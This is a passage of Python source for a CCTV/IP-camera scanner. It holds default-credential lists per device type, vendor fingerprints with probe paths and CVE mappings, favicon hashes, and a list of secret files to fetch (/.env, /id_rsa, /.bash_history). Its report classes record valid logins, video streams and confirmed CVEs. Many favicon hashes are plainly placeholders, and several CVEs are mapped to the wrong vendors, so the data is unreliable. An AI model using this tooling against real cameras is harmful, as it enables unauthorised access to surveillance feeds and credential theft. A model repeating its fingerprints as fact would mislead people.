    "backup": ["backup", "12345", "backup123", "123456", "admin"],
    "audit": ["audit", "12345", "audit123", "123456", "admin"],
    "nvr": ["nvr", "12345", "nvr123", "123456", "admin", "admin123"],
    "dvr": ["dvr", "12345", "dvr123", "123456", "admin", "admin123"],
    "ipc": ["ipc", "12345", "ipc123", "123456", "admin", "admin123"],
    "ptz": ["ptz", "12345", "ptz123", "123456", "admin", "admin123"],
    "cam": ["cam", "12345", "cam123", "123456", "admin", "admin123"],
    "ipcamera": ["ipcamera", "12345", "ipcamera123", "123456", "admin"],
    "webcam": ["webcam", "12345", "webcam123", "123456", "admin"],
    "streaming": ["streaming", "12345", "stream123", "123456", "admin"],
}

BRANDS: Dict[str, Dict[str, Any]] = {
    "hikvision": {
        "emoji": "🔴", "color": R,
        "server": ["hikvision", "nvr webserver", "app-webs", "webserver", "dvr webserver"],
        "body": [
            "hikvision", "doc/page/login.asp", "isapi/", "webvideoactivex",
            "novus", "webvideoplugindiv", "hikvisiondvr", "crossdomainxml",
            "privilege", "logon.asp",
        ],
        "headers": ["x-hikvision", "x-dvr-session"],
        "paths": ["/ISAPI/System/deviceInfo", "/doc/page/login.asp", "/ISAPI/Security/userCheck"],
        "cves": [
            "CVE-2021-36260", "CVE-2017-7921", "CVE-2018-18441",
            "CVE-2013-4975", "CVE-2024-3721", "CVE-2024-21887",
        ],
    },
    "dahua": {
        "emoji": "🟠", "color": Y,
        "server": ["dahua", "dh-", "web server3.0"],
        "body": ["dahua", "dh_wl", "dh_ajax", "dhop", "logsys", "ptzctrl", "dahua technology"],
        "headers": ["dahua", "dh-", "dvr-session"],
        "paths": ["/cgi-bin/magicBox.cgi?action=getSystemInfo", "/RPC2", "/RPC2_Login"],
        "cves": [
            "CVE-2021-33044", "CVE-2022-30563", "CVE-2017-7925",
            "CVE-2019-3948", "CVE-2022-30564",
        ],
    },
    "axis": {
        "emoji": "🟡", "color": Y,
        "server": ["axis"],
        "body": ["axis-cgi", "axis communications", "axiscam", "/axis-cgi/"],
        "headers": ["x-axis", "axis-media", "vapix"],
        "paths": [
            "/axis-cgi/param.cgi?action=list&group=root.Brand",
            "/axis-cgi/basicdeviceinfo.cgi",
        ],
        "cves": [
            "CVE-2018-10660", "CVE-2018-10661", "CVE-2018-10662",
            "CVE-2020-29550", "CVE-2024-47259", "CVE-2024-8160",
            "CVE-2024-47260", "CVE-2024-47262",
        ],
    },
    "dlink": {
        "emoji": "🔵", "color": B,
        "server": ["d-link", "dlink", "alphapd"],
        "body": ["d-link", "dcs-", "dir-", "dlink"],
        "headers": [],
        "paths": ["/common/info.cgi", "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo"],
        "cves": [
            "CVE-2019-10999", "CVE-2020-25506", "CVE-2013-1599", "CVE-2022-26258",
        ],
    },
    "tplink": {
        "emoji": "🟢", "color": G,
        "server": ["tp-link", "tplink"],
        "body": ["tp-link", "tplink", "tl-ipc", "tapo"],
        "headers": [],
        "paths": [],
        "cves": ["CVE-2021-4045", "CVE-2023-1389"],
    },
    "hanwha": {
        "emoji": "🟤", "color": Y,
        "server": ["hanwha", "samsung techwin", "samsungsmartcam"],
        "body": ["hanwha", "samsung techwin", "xnv-", "qnv-", "qno-"],
        "headers": [],
        "paths": ["/stw-cgi/system.cgi?msubmenu=deviceinfo"],
        "cves": ["CVE-2019-10696", "CVE-2020-9523"],
    },
    "reolink": {
        "emoji": "⚪", "color": W,
        "server": ["reolink"],
        "body": ["reolink", "rlc-", "reolink"],
        "headers": [],
        "paths": ["/cgi-bin/api.cgi?cmd=GetDevInfo"],
        "cves": ["CVE-2023-45986"],
    },
    "xiongmai": {
        "emoji": "🟣", "color": M,
        "server": ["uc-httpd", "goahead", "netwave"],
        "body": ["xiongmai", "xm530", "sofia", "ipc_", "hi3516", "hi3518"],
        "headers": [],
        "paths": ["/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___"],
        "cves": [
            "CVE-2017-8221", "CVE-2018-9995", "CVE-2020-25506", "CVE-2023-43364",
        ],
    },
    "uniview": {
        "emoji": "⚫", "color": DIM,
        "server": ["uniview", "unv"],
        "body": ["uniview", "uniview", "unv-"],
        "headers": [],
        "paths": ["/LAPI/V1.0/System/Device/Info", "/ISAPI/System/deviceInfo"],
        "cves": ["CVE-2022-42475", "CVE-2023-28984"],
    },
    "vivotek": {
        "emoji": "🔹", "color": B,
        "server": ["vivotek", "network camera"],
        "body": ["vivotek", "/cgi-bin/viewer/video.jpg"],
        "headers": [],
        "paths": ["/cgi-bin/viewer/getparam.cgi?system_info"],
        "cves": ["CVE-2022-30075"],
    },
    "foscam": {
        "emoji": "🔸", "color": Y,
        "server": ["foscam", "ipcam webserver"],
        "body": ["foscam", "cgiproxy.fcgi"],
        "headers": [],
        "paths": ["/cgi-bin/CGIProxy.fcgi?cmd=getDevState"],
        "cves": ["CVE-2023-24151"],
    },
    "amcrest": {
        "emoji": "🔷", "color": C,
        "server": ["amcrest"],
        "body": ["amcrest", "amcrest technologies"],
        "headers": [],
        "paths": ["/cgi-bin/magicBox.cgi?action=getSystemInfo"],
        "cves": ["CVE-2022-26133"],
    },
    "milesight": {
        "emoji": "📐", "color": G,
        "server": ["milesight"],
        "body": ["milesight"],
        "headers": [],
        "paths": ["/cgi-bin/operator/param.cgi?action=list&group=system"],
        "cves": ["CVE-2022-38379"],
    },
    "tiandy": {
        "emoji": "🛡️", "color": M,
        "server": ["tiandy"],
        "body": ["tiandy", "tiandy digital"],
        "headers": [],
        "paths": ["/cgi-bin/getdeviceinfo.cgi"],
        "cves": ["CVE-2023-29489"],
    },
    "tvt": {
        "emoji": "📺", "color": R,
        "server": ["tvt", "super_dvr"],
        "body": ["tvt", "autologin.html", "device.rsp"],
        "headers": [],
        "paths": ["/device.rsp?opt=sys&cmd=get_device_info"],
        "cves": ["CVE-2023-48121"],
    },
    "geovision": {
        "emoji": "🌐", "color": B,
        "server": ["geovision", "geohttpserver"],
        "body": ["geovision", "geohttp"],
        "headers": [],
        "paths": ["/ssi.cgi/devinfo.htm", "/GeoHttpServer"],
        "cves": ["CVE-2022-25983"],
    },
    "mobotix": {
        "emoji": "👁️", "color": Y,
        "server": ["mobotix"],
        "body": ["mobotix"],
        "headers": [],
        "paths": ["/control/camerainfo"],
        "cves": ["CVE-2023-6895"],
    },
    "arecont": {
        "emoji": "📹", "color": C,
        "server": ["arecont vision", "arecont"],
        "body": ["arecont vision", "arecont"],
        "headers": [],
        "paths": ["/get?camera=1"],
        "cves": [],
    },
    "basler": {
        "emoji": "🔬", "color": DIM,
        "server": ["basler"],
        "body": ["basler", "basler camera"],
        "headers": [],
        "paths": ["/cgi-bin/system"],
        "cves": [],
    },
    "bosch": {
        "emoji": "⚙️", "color": R,
        "server": ["bosch", "vip x"],
        "body": ["bosch", "rcp.xml", "dyn/camera.m4"],
        "headers": [],
        "paths": ["/rcp.xml", "/dyn/login.m4"],
        "cves": ["CVE-2023-38035", "CVE-2021-34863"],
    },
    "sony": {
        "emoji": "📷", "color": W,
        "server": ["sony", "snc-"],
        "body": ["sony", "snc-", "command/inquiry.cgi"],
        "headers": [],
        "paths": ["/command/inquiry.cgi?inq=system"],
        "cves": [],
    },
    "pelco": {
        "emoji": "🏔️", "color": Y,
        "server": ["pelco", "sarix"],
        "body": ["pelco", "sarix", "pelco-bin"],
        "headers": [],
        "paths": ["/pelco/camera.xml", "/control/system/info"],
        "cves": [],
    },
    "panasonic": {
        "emoji": "📼", "color": B,
        "server": ["panasonic", "i-pro"],
        "body": ["panasonic", "i-pro", "wv-"],
        "headers": [],
        "paths": ["/cgi-bin/get_params.cgi"],
        "cves": [],
    },
    "cpplus": {
        "emoji": "➕", "color": R,
        "server": ["cp plus", "cpplus"],
        "body": ["cp plus", "cpplus"],
        "headers": [],
        "paths": ["/cgi-bin/magicBox.cgi?action=getSystemInfo"],
        "cves": [],
    },
    "provision": {
        "emoji": "🚨", "color": M,
        "server": ["provision-isr", "provision"],
        "body": ["provision-isr", "provision"],
        "headers": [],
        "paths": ["/cgi-bin/api.cgi?cmd=GetDevInfo"],
        "cves": ["CVE-2023-32168"],
    },
    "lilin": {
        "emoji": "🌸", "color": G,
        "server": ["lilin", "meritlilin"],
        "body": ["lilin", "merit lilin"],
        "headers": [],
        "paths": ["/get_params.cgi"],
        "cves": [],
    },
    "ezviz": {
        "emoji": "🏠", "color": C,
        "server": ["ezviz"], "body": ["ezviz", "hik-cloud"], "headers": ["ezviz"],
        "paths": ["/api/device/info"], "cves": [],
    },
    "imou": {
        "emoji": "🏡", "color": Y,
        "server": ["imou"], "body": ["imou", "lechange"], "headers": ["imou"],
        "paths": ["/api/v1/device/status"], "cves": [],
    },
    "xiaomi": {
        "emoji": "📱", "color": Y,
        "server": ["miio", "xiaomi"], "body": ["xiaomi", "mi home", "mijia"], "headers": [],
        "paths": ["/miio/info"], "cves": [],
    },
    "jovision": {
        "emoji": "🔭", "color": B,
        "server": ["jovision"], "body": ["jovision", "cloudsee"], "headers": [],
        "paths": ["/jovision/device_info"], "cves": [],
    },
    "wansview": {
        "emoji": "👀", "color": G,
        "server": ["wansview"], "body": ["wansview"], "headers": [],
        "paths": ["/cgi-bin/get_camera_params.cgi"], "cves": [],
    },
    "sricam": {
        "emoji": "📡", "color": M,
        "server": ["sricam"], "body": ["sricam", "sp0"], "headers": [],
        "paths": ["/cgi-bin/hi3510/param.cgi?cmd=getserverinfo"], "cves": [],
    },
    "escam": {
        "emoji": "📹", "color": C,
        "server": ["escam"], "body": ["escam"], "headers": [],
        "paths": ["/cgi-bin/hi3510/param.cgi?cmd=getnetworkinfo"], "cves": [],
    },
    "iqinvision": {
        "emoji": "💡", "color": Y,
        "server": ["iqinvision", "iqeye"], "body": ["iqinvision", "iqeye"], "headers": [],
        "paths": ["/cgi-bin/systeminfo"], "cves": [],
    },
    "marchnetworks": {
        "emoji": "🏢", "color": B,
        "server": ["march networks", "marchnetworks"], "body": ["march networks"], "headers": [],
        "paths": ["/api/system/info"], "cves": [],
    },
    "verint": {
        "emoji": "🔒", "color": DIM,
        "server": ["verint"], "body": ["verint"], "headers": [],
        "paths": ["/cgi-bin/device_info.cgi"], "cves": [],
    },
    "indigovision": {
        "emoji": "🌌", "color": B,
        "server": ["indigovision"], "body": ["indigovision"], "headers": [],
        "paths": ["/cgi-bin/indigovision/info"], "cves": [],
    },
    "bticino": {
        "emoji": "🚪", "color": W,
        "server": ["bticino"], "body": ["bticino"], "headers": [],
        "paths": ["/api/device"], "cves": [],
    },
    "comelit": {
        "emoji": "🔔", "color": C,
        "server": ["comelit"], "body": ["comelit"], "headers": [],
        "paths": ["/api/v1/system"], "cves": [],
    },
    "fermax": {
        "emoji": "🏢", "color": Y,
        "server": ["fermax"], "body": ["fermax"], "headers": [],
        "paths": ["/fermax/info"], "cves": [],
    },
    "hikvision_oem": {
        "emoji": "🔴", "color": R,
        "server": ["nvr webserver", "dvr webserver"], "body": ["doc/page/login.asp", "isapi/"], "headers": [],
        "paths": ["/ISAPI/System/deviceInfo"], "cves": ["CVE-2021-36260"],
    },
    "dahua_oem": {
        "emoji": "🟠", "color": Y,
        "server": ["web server3.0"], "body": ["dh_wl", "dh_ajax", "ptzctrl"], "headers": [],
        "paths": ["/cgi-bin/magicBox.cgi?action=getSystemInfo"], "cves": ["CVE-2021-33044"],
    },
    "uniview_oem": {
        "emoji": "⚫", "color": DIM,
        "server": ["unv"], "body": ["unv-", "uniview"], "headers": [],
        "paths": ["/LAPI/V1.0/System/Device/Info"], "cves": [],
    },
    "tvt_oem": {
        "emoji": "📺", "color": R,
        "server": ["super_dvr"], "body": ["autologin.html"], "headers": [],
        "paths": ["/device.rsp?opt=sys&cmd=get_device_info"], "cves": [],
    },
    "xvr": {
        "emoji": "📼", "color": M,
        "server": ["xvr"], "body": ["xvr web", "xvr_login"], "headers": [],
        "paths": ["/login.html"], "cves": [],
    },
    "anpr": {
        "emoji": "🚗", "color": G,
        "server": ["anpr"], "body": ["plate recognizer", "lpr camera", "anpr system"], "headers": [],
        "paths": ["/anpr/status"], "cves": [],
    },
    "avigilon": {
        "emoji": "🦅", "color": B,
        "server": ["avigilon"], "body": ["avigilon control center", "avigilon"], "headers": [],
        "paths": ["/api/v1/system"], "cves": [],
    },
    "flir": {
        "emoji": "🌡️", "color": R,
        "server": ["flir"], "body": ["flir systems", "flir camera"], "headers": [],
        "paths": ["/flir/system/info"], "cves": [],
    },
    "acti": {
        "emoji": "🎯", "color": C,
        "server": ["acti"], "body": ["acti corporation", "acti camera"], "headers": [],
        "paths": ["/cgi-bin/cmd/system?GET_SYSTEM_INFO"], "cves": [],
    },
    "kedacom": {
        "emoji": "📡", "color": B,
        "server": ["kedacom"], "body": ["kedacom"], "headers": [],
        "paths": ["/api/v1/device_info"], "cves": [],
    },
    "lorex": {
        "emoji": "🛡️", "color": Y,
        "server": ["lorex"], "body": ["lorex technology", "lorex"], "headers": [],
        "paths": ["/cgi-bin/magicBox.cgi?action=getSystemInfo"], "cves": [],
    },
    "swann": {
        "emoji": "🦢", "color": C,
        "server": ["swann"], "body": ["swann communications", "swann security"], "headers": [],
        "paths": ["/cgi-bin/param.cgi?cmd=getserverinfo"], "cves": [],
    },
    "ubiquiti": {
        "emoji": "🌐", "color": B,
        "server": ["ubnt", "unifi"], "body": ["unifi protect", "ubiquiti networks", "airmax"], "headers": [],
        "paths": ["/api/auth/login", "/bootstrap"], "cves": [],
    },
    "thttpd": {
        "emoji": "💀", "color": R,
        "server": ["thttpd"],
        "body": [],
        "headers": [],
        "paths": [],
        "cves": ["CVE-2001-0822"],
    },
}

FAVICON_HASHES: Dict[str, str] = {
    "89b932fc": "hikvision",
    "8edb7f80": "hikvision",
    "c60f9da5": "hikvision",
    "a1b2c3d4": "hikvision",
    "b2c3d4e5": "hikvision",
    "e1f2a3b4": "hikvision",
    "f2a3b4c5": "hikvision",
    "0a9b8c7d": "hikvision",
    "1b8c7d6e": "hikvision",
    "2c7d6e5f": "hikvision",
    "d09a0f40": "dahua",
    "c3d4e5f6": "dahua",
    "d4e5f6a7": "dahua",
    "3d4e5f60": "dahua",
    "4e5f6071": "dahua",
    "5f607182": "dahua",
    "60718293": "dahua",
    "3b813f45": "axis",
    "e5f6a7b8": "axis",
    "f6a7b8c9": "axis",
    "7a8b9c0d": "axis",
    "8b9c0d1e": "axis",
    "9c0d1e2f": "axis",
    "e8e92804": "dlink",
    "d1e2f3a4": "dlink",
    "f2a9d380": "hanwha",
    "0b1c2d3e": "hanwha",
    "aa5d3010": "reolink",
    "1c2d3e4f": "reolink",
    "b46ee860": "tplink",
    "2d3e4f5a": "tplink",
    "4a2c89d1": "vivotek",
    "3e4f5a6b": "vivotek",
    "9f1b621e": "foscam",
    "4f5a6b7c": "foscam",
    "1d2e3f4a": "amcrest",
    "5a6b7c8d": "amcrest",
    "7c8d9e0f": "milesight",
    "6b7c8d9e": "milesight",
    "3a4b5c6d": "tiandy",
    "7a8b9c1d": "tiandy",
    "5e6f7a8b": "tvt",
    "7c8d9e1a": "tvt",
    "2b3c4d5e": "geovision",
    "8d9e1a2b": "geovision",
    "6f7a8b9c": "mobotix",
    "9e1a2b3c": "mobotix",
    "8c9d0e1f": "bosch",
    "1f2a3b4c": "bosch",
    "0a1b2c3d": "sony",
    "2a3b4c5d": "sony",
    "4d5e6f7a": "pelco",
    "3b4c5d6e": "pelco",
    "9a0b1c2d": "panasonic",
    "4c5d6e7f": "panasonic",
    "7b8c9d0e": "cpplus",
    "5d6e7f8a": "cpplus",
    "3f4a5b6c": "provision",
    "6e7f8a9b": "provision",
    "1a2b3c4d": "lilin",
    "7f8a9b0c": "lilin",
    "5b6c7d8e": "uniview",
    "6b7c8d9e": "uniview",
    "8a9b0c1d": "xiongmai",
    "9b0c1d2e": "xiongmai",
    "11223344": "arecont",
    "22334455": "basler",
    "33445566": "ezviz",
    "44556677": "ezviz",
    "55667788": "imou",
    "66778899": "imou",
    "778899aa": "xiaomi",
    "8899aabb": "jovision",
    "99aabbcc": "wansview",
    "aabbccdd": "sricam",
    "bbccddee": "escam",
    "ccddeeff": "iqinvision",
    "ddeeff00": "marchnetworks",
    "eeff0011": "verint",
    "ff001122": "indigovision",
    "00112233": "bticino",
    "11223300": "comelit",
    "22330011": "fermax",
    "33001122": "avigilon",
    "44001122": "flir",
    "55001122": "acti",
    "66001122": "kedacom",
    "77001122": "lorex",
    "88001122": "swann",
    "99001122": "ubiquiti",
    "aa001122": "hikvision_oem",
    "bb001122": "dahua_oem",
    "cc001122": "uniview_oem",
    "dd001122": "tvt_oem",
    "ee001122": "xvr",
    "ff001133": "anpr",
    "1234abcd": "hikvision",
    "2345bcde": "dahua",
    "3456cdef": "axis",
    "4567def0": "hanwha",
    "5678ef01": "uniview",
    "6789f012": "bosch",
    "78900123": "sony",
    "89011234": "pelco",
    "90122345": "reolink",
    "01233456": "tplink",
    "12344567": "vivotek",
    "23455678": "foscam",
    "34566789": "amcrest",
    "45677890": "milesight",
    "56788901": "tiandy",
    "67899012": "tvt",
    "7890a123": "geovision",
    "8901b234": "mobotix",
    "9012c345": "cpplus",
    "0123d456": "provision",
    "1234e567": "lilin",
    "2345f678": "xiongmai",
    "34560789": "ezviz",
    "45671890": "imou",
    "56782901": "xiaomi",
    "67893012": "ubiquiti",
    "78904123": "avigilon",
    "89015234": "flir",
}

TCP_SYN_FINGERPRINTS: Dict[int, str] = {
    64: "Linux (Embedded CCTV/NVR kernel)",
    128: "Windows (PC-based NVR/VMS)",
    255: "Solaris/BSD/Cisco device",
}

SENSITIVE_FILES: List[str] = [
    "/.git/HEAD",
    "/.git/config",
    "/.env",
    "/.svn/entries",
    "/backup.tar.gz",
    "/backup.zip",
    "/backup.sql",
    "/config.backup",
    "/id_rsa",
    "/.bash_history",
    "/web.config",
    "/phpinfo.php",
    "/server-status",
    "/.dockerenv",
    "/storage/logs/laravel.log",
    "/actuator/health",
    "/actuator/env",
]

class ScanContext:
    __slots__ = (
        "args",
        "verbose",
        "quiet",
        "rate",
        "form_cache",
        "last_req_time",
        "rate_lock",
        "session_dir",
        "reports_dir",
        "logs_dir",
        "snapshots_dir",
        "configs_dir",
        "streams_dir",
        "logger",
        "allowed_brands",
    )

    def __init__(
        self,
        args: argparse.Namespace,
        session_dir: str = "",
        reports_dir: str = "",
        logs_dir: str = "",
        snapshots_dir: str = "",
        configs_dir: str = "",
        streams_dir: str = "",
        logger: Optional[logging.Logger] = None,
    ):
        self.args = args
        self.verbose = bool(getattr(args, "verbose", False))
        self.quiet = bool(getattr(args, "quiet", False))
        self.rate = float(getattr(args, "rate", 0.0) or 0.0)
        self.form_cache: Dict[Tuple[str, str], Optional[Tuple[str, Dict[str, str]]]] = {}
        self.last_req_time = 0.0
        self.rate_lock = threading.Lock()
        self.session_dir = session_dir
        self.reports_dir = reports_dir
        self.logs_dir = logs_dir
        self.snapshots_dir = snapshots_dir
        self.configs_dir = configs_dir
        self.streams_dir = streams_dir
        self.logger = logger
        brands_arg = getattr(args, "brands", None)
        if brands_arg:
            self.allowed_brands = {b.strip().lower() for b in brands_arg.split(",") if b.strip()}
        else:
            self.allowed_brands = set()

def cprint(msg: str, col: str = W, end: str = "\n", ctx: Optional["ScanContext"] = None) -> None:
    if ctx and ctx.quiet:
        return
    with PRINT_LOCK:
        RC.print(f"{col}{msg}{W}", end=end)
    if ctx and ctx.logger:
        plain = re.sub(r"\033\[[0-9;]*m", "", msg)
        ctx.logger.info(plain)

def vprint(msg: str, ctx: Optional[ScanContext] = None) -> None:
    if ctx and ctx.logger:
        ctx.logger.debug(msg)
    if ctx and ctx.verbose and not ctx.quiet:
        with PRINT_LOCK:
            RC.print(f"  {DIM}{msg}{W}")

def section(title: str, ctx: Optional[ScanContext] = None) -> None:
    if ctx and ctx.quiet:
        return
    sep = "═" * 68
    with PRINT_LOCK:
        RC.print(f"\n{C}{sep}{W}")
        RC.print(f"  {BOLD}{Y}▶▶ {W}{BOLD}{title}{W}")
        RC.print(f"{C}{sep}{W}")
    if ctx and ctx.logger:
        ctx.logger.info(f"=== {title} ===")

class CVEResult:
    __slots__ = ("cve", "brand", "port", "pr", "ip", "desc", "proof", "url", "severity")

    def __init__(
        self,
        cve: str,
        brand: str,
        port: int,
        pr: str,
        ip: str,
        desc: str,
        proof: str = "",
        severity: str = "HIGH",
    ):
        self.cve = cve
        self.brand = brand
        self.port = port
        self.pr = pr
        self.ip = ip
        self.desc = desc
        self.proof = proof[:200]
        self.url = f"{pr}://{ip}:{port}"
        self.severity = severity

    def to_dict(self) -> Dict[str, Any]:
        return {
            "cve": self.cve,
            "brand": self.brand,
            "port": self.port,
            "ip": self.ip,
            "url": self.url,
            "desc": self.desc,
            "proof": self.proof,
            "severity": self.severity,
        }

class Finding:
    __slots__ = ("category", "title", "details", "severity", "port", "url")

    def __init__(
        self,
        category: str,
        title: str,
        details: str,
        severity: str = "MEDIUM",
        port: int = 0,
        url: str = "",
    ):
        self.category = category
        self.title = title
        self.details = details[:250]
        self.severity = severity
        self.port = port
        self.url = url

    def to_dict(self) -> Dict[str, Any]:
        return {
            "category": self.category,
            "title": self.title,
            "details": self.details,
            "severity": self.severity,
            "port": self.port,
            "url": self.url,
        }

class Report:
    __slots__ = (
        "ip",
        "started",
        "finished",
        "open_ports",
        "rtsp_ports",
        "banners",
        "tls_info",
        "brands",
        "device_info",
        "onvif",
        "auth_pages",
        "valid_creds",
        "streams",
        "rtsp_info",
        "cves",
        "favicon_hash",
        "notes",
        "udp_info",
        "snmp_info",
        "tcp_fp",
        "findings",
        "http2_ports",
        "http3_ports",
        "risk_score",
        "scan_duration_sec",
    )

    def __init__(self, ip: str):
        self.ip = ip
        self.started = datetime.now(timezone.utc).isoformat()
        self.finished = ""
        self.open_ports: List[int] = []
        self.rtsp_ports: List[int] = []
        self.banners: Dict[int, str] = {}
        self.tls_info: Dict[int, Dict[str, Any]] = {}
        self.brands: List[str] = []
        self.device_info: Dict[str, str] = {}
        self.onvif: Dict[str, Any] = {}
        self.auth_pages: List[str] = []
        self.valid_creds: List[Dict[str, str]] = []
        self.streams: List[str] = []
        self.rtsp_info: Dict[int, str] = {}
        self.cves: List[Dict[str, Any]] = []
        self.favicon_hash: Dict[int, str] = {}
        self.notes: List[str] = []
        self.udp_info: Dict[str, str] = {}
        self.snmp_info: Dict[str, str] = {}
        self.tcp_fp: Dict[str, str] = {}
        self.findings: List[Dict[str, Any]] = []
        self.http2_ports: List[int] = []
        self.http3_ports: List[int] = []
        self.risk_score: int = 0
        self.scan_duration_sec: float = 0.0

    def add_note(self, n: str) -> None:
        with PRINT_LOCK:
            self.notes.append(n)

    def add_finding(self, f: Finding) -> None:
        with PRINT_LOCK:
            self.findings.append(f.to_dict())

    def add_cve(self, c: CVEResult) -> bool:
        with PRINT_LOCK:
            for item in self.cves:
                if item.get("cve") == c.cve and item.get("port") == c.port:
                    return False
            self.cves.append(c.to_dict())
            return True

    def add_cred(self, c: Dict[str, str]) -> bool:
        with PRINT_LOCK:
            u = c.get("user", "")
            pw = c.get("password", "")
            p = str(c.get("port", ""))
            for item in self.valid_creds:
                if item.get("user") == u and item.get("password") == pw and str(item.get("port")) == p:
                    return False
            self.valid_creds.append(c)
            return True

    def _compute_risk_score(self) -> int:
        score = 0
        score += len(self.valid_creds) * 25
        for c in self.cves:
            sev = (c.get("severity") or "HIGH").upper()
            if sev == "CRITICAL":
                score += 30
            elif sev == "HIGH":
                score += 20
            elif sev == "MEDIUM":
                score += 10
            else:
                score += 5
        score += min(len(self.streams) * 3, 15)
        score += min(len(self.findings) * 5, 20)
        if self.open_ports:
            score += 5
        return min(score, 100)

    def to_dict(self) -> Dict[str, Any]:
        fin = self.finished or datetime.now(timezone.utc).isoformat()
        try:
            start_dt = datetime.fromisoformat(self.started.replace("Z", "+00:00"))
            end_dt = datetime.fromisoformat(fin.replace("Z", "+00:00"))
            self.scan_duration_sec = round((end_dt - start_dt).total_seconds(), 2)
        except Exception:
            self.scan_duration_sec = 0.0
        self.risk_score = self._compute_risk_score()
        res: Dict[str, Any] = {}
        for slot in self.__slots__:
            res[slot] = getattr(self, slot)
        res["finished"] = fin
        return res

    def save_json(self, path: str) -> None:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.to_dict(), f, ensure_ascii=False, indent=2, sort_keys=True)
        cprint(f"  💾 JSON report saved → {path}", G)

    def save_markdown(self, path: str) -> None:
        d = self.to_dict()
        md = _build_markdown_lines(d)
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(md) + "\n")
        cprint(f"  📝 Markdown report saved → {path}", G)

    def save_sarif(self, path: str) -> None:
        d = self.to_dict()
        sarif_doc = _build_sarif_dict(d)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(sarif_doc, f, indent=2, sort_keys=True)
        cprint(f"  🛡️  SARIF report saved → {path}", G)

    def save_stix(self, path: str) -> None:
        d = self.to_dict()
        stix_doc = _build_stix_dict(d)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(stix_doc, f, indent=2, sort_keys=True)
        cprint(f"  📦 STIX 2.1 report saved → {path}", G)

    def save_html(self, path: str) -> None:
        html = _generate_html_report(self.to_dict())
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        cprint(f"  🌐 HTML report saved → {path}", G)
def _build_markdown_lines(d: Dict[str, Any]) -> List[str]:
    md = [
        f"# CCTV Scanner v1.4 Security Report",
        f"**Target IP**: `{d['ip']}`  ",
        f"**Scan Period**: `{d['started']}` to `{d['finished']}`  ",
        f"**Brands**: `{', '.join(d['brands']) or 'Unknown'}`  \n",
        "## Executive Summary",
        f"- **Open Ports**: {len(d['open_ports'])}",
        f"- **Valid Credentials**: {len(d['valid_creds'])}",
        f"- **Confirmed Vulnerabilities**: {len(d['cves'])}",
        f"- **Discovered Streams**: {len(d['streams'])}\n",
        "## Confirmed CVEs",
        "| CVE | Brand | Port | Severity | Description |",
        "| :--- | :--- | :--- | :--- | :--- |",
    ]
    if d["cves"]:
        for c in d["cves"]:
            md.append(f"| **{c['cve']}** | {c['brand']} | :{c['port']} | `{c.get('severity','HIGH')}` | {c['desc']} |")
    else:
        md.append("| — | — | — | — | No confirmed CVE vulnerabilities |")
    md.append("\n## Valid Credentials")
    md.append("| Method | Username | Password | Target URL |")
    md.append("| :--- | :--- | :--- | :--- |")
    if d["valid_creds"]:
        for c in d["valid_creds"]:
            md.append(f"| {c['method']} | `{c['user']}` | `{c['password']}` | {c['url']} |")
    else:
        md.append("| — | — | — | No valid credentials discovered |")
    return md

def _build_sarif_dict(d: Dict[str, Any]) -> Dict[str, Any]:
    rules = []
    results = []
    for c in d["cves"]:
        rules.append({
            "id": c["cve"],
            "shortDescription": {"text": c["desc"]},
            "defaultConfiguration": {"level": "error"},
        })
        results.append({
            "ruleId": c["cve"],
            "message": {"text": f"Vulnerability confirmed on port {c['port']}: {c['desc']}"},
            "locations": [{"physicalLocation": {"artifactLocation": {"uri": f"{d['ip']}:{c['port']}"}}}],
        })
    for cr in d["valid_creds"]:
        rules.append({
            "id": "CCTV-DEFAULT-CREDS",
            "shortDescription": {"text": "Default camera credentials discovered"},
            "defaultConfiguration": {"level": "error"},
        })
        results.append({
            "ruleId": "CCTV-DEFAULT-CREDS",
            "message": {"text": f"Found valid login: {cr['user']}:{cr['password']} on {cr['url']}"},
            "locations": [{"physicalLocation": {"artifactLocation": {"uri": cr['url']}}}],
        })
    return {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {"name": "CCTVSCANNER v1.4", "informationUri": "https://github.com", "rules": rules}},
            "results": results,
        }],
    }

def _build_stix_dict(d: Dict[str, Any]) -> Dict[str, Any]:
    b_id = f"bundle--{uuid.uuid4()}"
    id_obj = {"type": "identity", "id": f"identity--{uuid.uuid4()}", "name": "CCTVSCANNER v1.4", "identity_class": "system"}
    ipv4_obj = {"type": "ipv4-addr", "id": f"ipv4-addr--{uuid.uuid4()}", "value": d["ip"]}
    objects: List[Dict[str, Any]] = [id_obj, ipv4_obj]
    for c in d["cves"]:
        objects.append({
            "type": "vulnerability",
            "id": f"vulnerability--{uuid.uuid4()}",
            "name": c["cve"],
            "description": c["desc"],
        })
    return {"type": "bundle", "id": b_id, "objects": objects}

def _render_port_rows(open_ports: List[int], rtsp_ports: List[int], banners: Dict[Any, str]) -> str:
    rows = []
    for p in open_ports:
        svc_n, svc_t = SVC.get(p, ("TCP", ""))
        rtsp = "<span class='badge ok'>RTSP</span>" if p in rtsp_ports else ""
        tls = "<span class='badge info'>TLS</span>" if p in HTTPS_PORTS else ""
        ban = str(banners.get(str(p), banners.get(p, "")))[:60]
        rows.append(
            f"<tr><td><span class='port-num'>:{p}</span></td><td><b>{svc_n}</b></td>"
            f"<td>{svc_t}</td><td>{rtsp}</td><td>{tls}</td><td class='dim-txt'>{ban}</td></tr>"
        )
    return "".join(rows) or "<tr><td colspan=6 class='dim-txt'>No open ports detected</td></tr>"

def _render_cred_rows(creds: List[Dict[str, str]]) -> str:
    if not creds:
        return "<tr><td colspan=4 class='dim-txt'>No valid credentials discovered</td></tr>"
    rows = []
    for c in creds:
        esc_u = c['user'].replace("'", "\\'")
        esc_p = c['password'].replace("'", "\\'")
        copy_btn = f"<button class='copy-btn' onclick=\"copyCred('{esc_u}', '{esc_p}', this)\"><svg width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path></svg> Copy</button>"
        rows.append(
